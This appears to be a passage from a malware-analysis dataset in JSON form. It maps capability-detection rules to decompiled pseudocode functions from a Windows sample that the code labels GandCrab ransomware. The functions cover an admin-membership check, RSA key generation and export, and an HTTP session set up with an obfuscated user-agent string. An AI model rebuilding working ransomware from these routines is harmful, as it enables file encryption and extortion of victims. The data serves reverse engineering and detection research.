= 6;\n    uStack36 = 0;\n    pcStack32 = L\"win32app\";\n    puStack140 = 0x402e5f;\n    uStack36 = (*_sym.imp.USER32.dll_LoadIconW)();\n    puStack140 = &stack0xffffffb0;\n    uStack144 = 0x402e6e;\n    iVar4 = (*_sym.imp.USER32.dll_RegisterClassExW)();\n    uStack144 = 0;\n    if (iVar4 == 0) {\n        uStack148 = 0x402e7b;\n        (*_sym.imp.KERNEL32.dll_ExitThread)();\n    }\n    uStack148 = 0x402e7d;\n    (*pcVar1)();\n    uStack148 = 0;\n    uStack152 = 0;\n    uStack156 = 0x402e83;\n    uStack156 = (*pcVar1)();\n    uStack160 = 0;\n    uStack164 = 0;\n    uStack168 = 5;\n    uStack172 = 5;\n    uStack176 = 0x80000000;\n    uStack180 = 0x80000000;\n    uStack184 = 0xcf0000;\n    pcStack188 = L\"firefox\";\n    pcStack192 = L\"win32app\";\n    uStack196 = 0;\n    uStack200 = 0x402ead;\n    iVar5 = (*_sym.imp.USER32.dll_CreateWindowExW)();\n    uStack200 = 0;\n    uStack204 = 0xfffffff0;\n    iStack212 = 0x402eba;\n    iStack208 = iVar5;\n    (*_sym.imp.USER32.dll_SetWindowLongW)();\n    if (iVar5 == 0) {\n        iStack216 = 0x402ec5;\n        iStack212 = iVar5;\n        (*_sym.imp.KERNEL32.dll_ExitThread)();\n    }\n    iStack212 = 5;\n    iStack216 = iVar5;\n    (*_sym.imp.USER32.dll_ShowWindow)();\n    (*_sym.imp.USER32.dll_UpdateWindow)(iVar5);\n    iVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402d10, iVar5, 0, 0);\n    if (iVar5 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n    }\n    pcVar2 = _sym.imp.USER32.dll_GetMessageW;\n    iVar5 = (*_sym.imp.USER32.dll_GetMessageW)(&stack0xffffff28, 0, 0, 0);\n    pcVar3 = _sym.imp.USER32.dll_DispatchMessageW;\n    pcVar1 = _sym.imp.USER32.dll_TranslateMessage;\n    while (iVar5 != 0) {\n        puStack116 = &stack0xffffffac;\n        puStack120 = 0x402f1e;\n        (*pcVar1)();\n        puStack120 = &stack0xffffffa8;\n        uStack124 = 0x402f25;\n        iVar5 = (*pcVar3)();\n        if (iVar5 == -0x21524111) break;\n        puStack116 = NULL;\n        puStack120 = NULL;\n        uStack124 = 0;\n        puStack128 = &stack0xffffffac;\n        uStack132 = 0x402f39;\n        iVar5 = (*pcVar2)();\n    }\ncode_r0x00402f3d:\n    puStack116 = NULL;\n    puStack120 = 0x402f45;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1604
    },
    "00402c50": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c50(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uchar auStack124 [4];\n    uchar auStack120 [8];\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar auStack80 [76];\n    \n    uStack96 = str.GandCrab_._16_4_;\n    uStack112 = str.GandCrab_._0_4_;\n    uStack108 = str.GandCrab_._4_4_;\n    uStack104 = str.GandCrab_._8_4_;\n    uStack100 = str.GandCrab_._12_4_;\n    if (arg_ch == 2) {\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00402ad0, 0, 0, 0);\n        (*_sym.imp.USER32.dll_DestroyWindow)(arg_8h);\n        return 0xdeadbeef;\n    }\n    if (arg_ch != 0xf) {\n        uVar1 = (*_sym.imp.USER32.dll_DefWindowProcW)(arg_8h, arg_ch, arg_10h, arg_14h);\n        return uVar1;\n    }\n    uVar1 = (*_sym.imp.USER32.dll_BeginPaint)(arg_8h, auStack80);\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(auStack120);\n    (*_sym.imp.GDI32.dll_TextOutW)(uVar1, 5, 5, auStack124, uVar2);\n    (*_sym.imp.USER32.dll_EndPaint)(arg_8h, &uStack112);\n    return 0;\n}\n",
        "token_count": 411
    },
    "00406440": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406440(int32_t param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n    if (100 < uVar2) {\n        uVar2 = 100;\n    }\n    uVar3 = 0;\n    if (uVar2 != 0) {\n        do {\n            cVar1 = *(uVar3 + param_1);\n            if ((((cVar1 < '0') || ('9' < cVar1)) && ((cVar1 < 'a' || ('z' < cVar1)))) &&\n               ((cVar1 < 'A' || ('Z' < cVar1)))) {\n                return 0;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 214
    },
    "null": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid entry0(void)\n\n{\n    fcn.004048a0();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    return;\n}\n",
        "token_count": 35
    },
    "00403a60": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00403a60(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    uint pSid;\n    uint32_t var_4h;\n    \n    pIdentifierAuthority = 0;\n    var_ch._0_2_ = 0x500;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &pSid);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"advapi32.dll\");\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"CheckTokenMembership\");\n    iVar1 = (*pcVar3)(0, pSid, &var_4h);\n    var_4h = var_4h & -(iVar1 != 0);\n    (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    return var_4h;\n}\n",
        "token_count": 279
    },
    "00405d80": {
        "rules": [
            "create new key via CryptAcquireContext"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405d80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint phKey;\n    uint phProv;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                      (&phProv, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 0);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar1 != -0x7ff6ffea) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                          (&phProv, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 8);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CryptGenKey)(phProv, 0xa400, 0x8000001, &phKey);\n    (*_sym.imp.ADVAPI32.dll_CryptExportKey)(phKey, 0, 6, 0, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CryptExportKey)(phKey, 0, 7, 0, arg_10h, arg_14h);\n    (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(phKey);\n    (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n    (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n              (&phProv, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 0x10);\n    return 1;\n}\n",
        "token_count": 412
    },
    "004077f0": {
        "rules": [
            "create HTTP request"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004077f0(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.WININET.dll_InternetOpenW;\n    var_4h._0_2_ = 0;\n    var_dch = 0x6f004d;\n    var_d8h = 0x69007a;\n    var_d4h = 0x6c006c;\n    var_d0h = 0x2f0061;\n    var_cch = 0x2e0035;\n    var_c8h = 0x200030;\n    var_c4h = 0x570028;\n    var_c0h = 0x6e0069;\n    var_bch = 0x6f0064;\n    var_b8h = 0x730077;\n    var_b4h = 0x4e0020;\n    var_b0h = 0x200054;\n    var_ach = 0x2e0036;\n    var_a8h = 0x3b0031;\n    var_a4h = 0x570020;\n    var_a0h = 0x57004f;\n    var_9ch = 0x340036;\n    var_98h = 0x200029;\n    var_94h = 0x700041;\n    var_90h = 0x6c0070;\n    var_8ch = 0x570065;\n    var_88h = 0x620065;\n    var_84h = 0x69004b;\n    var_80h = 0x2f0074;\n    var_7ch = 0x330035;\n    var_78h = 0x2e0037;\n    var_74h = 0x360033;\n    var_70h = 0x280020;\n    var_6ch = 0x48004b;\n    var_68h = 0x4d0054;\n    var_64h = 0x2c004c;\n    var_60h = 0x6c0020;\n    var_5ch = 0x6b0069;\n    var_58h = 0x200065;\n    var_54h = 0x650047;\n    var_50h = 0x6b0063;\n    var_4ch = 0x29006f;\n    var_48h = 0x430020;\n    var_44h = 0x720068;\n    var_40h = 0x6d006f;\n    var_3ch = 0x2f0065;\n    var_38h = 0x350035;\n    var_34h = 0x30002e;\n    var_30h = 0x32002e;\n    var_2ch = 0x380038;\n    var_28h = 0x2e0033;\n    var_24h = 0x370038;\n    var_20h = 0x530020;\n    var_1ch = 0x660061;\n    var_18h = 0x720061;\n    var_14h = 0x2f0069;\n    var_10h = 0x330035;\n    var_ch = 0x2e0037;\n    var_8h = 0x360033;\n    iVar2 = (*_sym.imp.WININET.dll_InternetOpenW)(&var_dch, 0, 0, 0, 0);\n    *(param_1 + 4) = iVar2;\n    if (iVar2 == 0) {\n        uVar3 = (*pcVar1)(&var_dch, 1, 0, 0, 0x10000000);\n        *(param_1 + 4) = uVar3;\n    }\n    return;\n}\n",
        "token_count": 1261
    }
}